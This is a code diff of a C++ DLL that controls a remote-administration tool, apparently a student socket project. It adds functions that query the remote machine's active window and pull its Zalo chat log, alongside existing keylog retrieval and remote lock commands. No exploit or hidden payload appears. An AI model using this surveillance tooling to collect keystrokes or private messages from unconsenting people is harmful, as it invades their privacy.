@@ -486,32 +486,23 @@ DLLEXPORT void GetKeylog() {
     sendCommandInternal("QUIT");
 }
 
-DLLEXPORT void GetNotificationHistory() {
-    // Vẫn ghi file vì đây là Binary DB
-    if (clientSocket == INVALID_SOCKET) return;
-    sendCommandInternal("GET_NOTI");
+DLLEXPORT const char* GetRemoteActiveWindow() { 
+    if (clientSocket == INVALID_SOCKET) return "Unknown|Not Connected";
     
-    string sizeStr = receiveLine();
-    long long fileSize = 0;
-    try { fileSize = stoll(sizeStr); } catch (...) {}
-    if (fileSize <= 0) return;
-
-    ofstream file("history.db", ios::binary);
-    char* buffer = new char[4096];
-    long long remaining = fileSize;
+    sendCommandInternal("GET_ACTIVE_APP");
     
-    DWORD timeout = 10000;
+    DWORD timeout = 2000;
     setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
 
-    while (remaining > 0) {
-        int bytesToRead = (remaining < 4096) ? (int)remaining : 4096;
-        int r = recv(clientSocket, buffer, bytesToRead, 0);
-        if (r <= 0) break;
-        file.write(buffer, r);
-        remaining -= r;
-    }
-    file.flush(); file.close();
-    delete[] buffer;
+    string data = receiveLine();
+    
+    DWORD defaultTimeout = 20000;
+    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&defaultTimeout, sizeof(defaultTimeout));
+
+    if (data.empty()) return "Unknown|Empty";
+
+    g_result_buffer = data;
+    return g_result_buffer.c_str();
 }
 
 // --- HÀM TẢI FILE TỪ SERVER VỀ CLIENT ---
@@ -615,4 +606,42 @@ DLLEXPORT void LockServer() {
     if (clientSocket != INVALID_SOCKET) {
         sendCommandInternal("LOCK");
     }
+}
+
+DLLEXPORT const char* GetZaloLog() {
+    if (clientSocket == INVALID_SOCKET) return "";
+    
+    sendCommandInternal("GET_ZALO_LOG");
+    
+    // 1. Nhận kích thước file
+    string sizeStr = receiveLine();
+    long long fileSize = 0;
+    try { fileSize = stoll(sizeStr); } catch (...) {}
+    
+    if (fileSize <= 0) {
+        g_result_buffer = "";
+        return g_result_buffer.c_str();
+    }
+    
+    // 2. Nhận toàn bộ nội dung file log
+    char* buffer = new char[fileSize + 1];
+    long long remaining = fileSize;
+    long long received = 0;
+    
+    DWORD timeout = 5000;
+    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+
+    while (remaining > 0) {
+        int r = recv(clientSocket, buffer + received, (int)remaining, 0);
+        if (r <= 0) break;
+        received += r;
+        remaining -= r;
+    }
+    buffer[received] = '\0'; // Kết thúc chuỗi
+    
+    // Lưu vào biến toàn cục để Python đọc
+    g_result_buffer = string(buffer);
+    delete[] buffer;
+    
+    return g_result_buffer.c_str();
 }
